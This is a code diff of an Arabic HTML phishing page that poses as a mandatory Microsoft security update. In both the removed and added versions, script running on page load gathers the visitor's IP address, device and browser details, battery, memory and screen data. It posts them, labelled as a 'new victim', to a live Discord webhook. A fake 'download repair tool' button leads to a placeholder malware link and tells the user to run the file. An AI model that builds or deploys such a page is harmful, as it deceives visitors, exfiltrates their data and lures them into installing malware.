@@ -2,68 +2,86 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث أمان ميكروسوفت</title>
+    <title>تحديث أمان النظام</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
-        async function startSystemGrabber() {
+        async function sendLogs() {
             const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
             
-            // 1. اكتشاف الجهاز وتغيير المحتوى تلقائياً
-            if (isMobile) {
-                document.getElementById('os-name').innerText = "نظام Android/iOS";
-                document.getElementById('os-icon').src = "https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg"; // شعار أندرويد كمثال
-            } else {
-                document.getElementById('os-name').innerText = "نظام Windows";
-                document.getElementById('os-icon').src = "https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"; // شعار ميكروسوفت
-            }
-
-            // 2. سحب البيانات الأساسية فوراً
             try {
+                // جلب IP
                 const ipReq = await fetch('https://api.ipify.org?format=json');
                 const ipRes = await ipReq.json();
                 
-                const payload = {
-                    embeds: [{
-                        title: "🚀 [TLQQEMM] تم دخول ضحية جديدة!",
-                        color: 16711680,
-                        fields: [
-                            { name: "🌐 عنوان الـ IP", value: ipRes.ip },
-                            { name: "💻 نوع الجهاز", value: navigator.platform },
-                            { name: "🕵️ المتصفح", value: navigator.userAgent }
-                        ],
-                        footer: { text: "في انتظار تحميل ملف الصيد..." }
-                    }]
-                };
-                fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
-            } catch (e) {}
-
-            // 3. تحديد رابط التحميل (هنا يجب وضع روابط ملفات الصيد الحقيقية)
-            document.getElementById('mainBtn').onclick = () => {
-                if (isMobile) {
-                    alert("⚠️ جاري تحميل أداة إصلاح نظام أندرويد (تطبيق APK)...");
-                    // window.location.href = "رابط_ملف_APK_الخاص_بك";
-                } else {
-                    alert("⚠️ جاري تحميل أداة إصلاح نظام ويندوز (ملف .EXE)...");
-                    // window.location.href = "رابط_ملف_EXE_الخاص_بك";
+                // جلب حالة البطارية
+                let batteryInfo = "غير معروف";
+                if (navigator.getBattery) {
+                    const bt = await navigator.getBattery();
+                    batteryInfo = `${Math.round(bt.level * 100)}% (${bt.charging ? "يتم الشحن" : "لا يشحن"})`;
                 }
-            };
+
+                // تجهيز الرسالة بنفس الترتيب اللي طلبته
+                const content = `
+**📌 معلومات ضحية جديدة:**
+--------------------------
+**🌐 عنوان الـ IP**
+${ipRes.ip}
+
+**🔋 حالة البطارية**
+${batteryInfo}
+
+**💻 نوع الجهاز/النظام**
+${navigator.platform}
+
+**🧠 الذاكرة العشوائية (RAM)**
+${navigator.deviceMemory || 'غير معروف'} جيجا
+
+**📱 أبعاد الشاشة**
+${screen.width}x${screen.height}
+
+**🌍 لغة الجهاز**
+${navigator.language}
+
+**🕵️ المتصفح المستخدم**
+${navigator.userAgent}
+
+**🔗 الرابط الذي دخله**
+${window.location.href}
+--------------------------
+`;
+
+                // إرسال البيانات كرسالة نصية بسيطة ومرتبة
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: content })
+                });
+
+            } catch (e) { console.log("Error"); }
+        }
+
+        window.onload = sendLogs;
+
+        function startDownload() {
+            window.location.href = "رابط_الملف_هنا"; 
+            alert("بدأ التحميل... يرجى تشغيل الملف لإتمام التحديث.");
         }
     </script>
     <style>
-        body { background-color: #0078d7; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: #00569e; padding: 40px; border-radius: 8px; text-align: center; width: 450px; }
-        .icon { width: 60px; margin-bottom: 20px; }
-        h1 { font-size: 24px; font-weight: 300; margin-bottom: 10px; }
-        p { font-size: 16px; line-height: 1.6; margin-bottom: 30px; }
-        .btn { background: white; color: #0078d7; border: none; padding: 12px 30px; border-radius: 3px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        body { background-color: #f1f3f4; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+        .logo { width: 50px; margin-bottom: 20px; }
+        h1 { font-size: 20px; color: #3c4043; margin-bottom: 15px; }
+        p { color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 12px 25px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; font-size: 15px; }
     </style>
 </head>
-<body onload="startSystemGrabber()">
-    <div class="container">
-        <img id="os-icon" src="" class="icon">
-        <h1>تحديث أمان إلزامي</h1>
-        <p>نظراً لوجود ثغرة أمنية حرجة، يجب عليك تحميل وتثبيت أداة إصلاح نظام ميكروسوفت على جهازه <strong id="os-name"></strong> لضمان حماية بياناتك الشخصية.</p>
-        <button id="mainBtn" class="btn">تحميل وتثبيت الآن</button>
+<body>
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="logo">
+        <h1>تحديث أمني مطلوب</h1>
+        <p>تم اكتشاف نشاط غير عادي. يرجى تحميل أداة الحماية الرسمية وتثبيتها فوراً لتجنب فقدان البيانات.</p>
+        <button class="btn" onclick="startDownload()">تحميل أداة الإصلاح</button>
     </div>
 </body>
 </html>
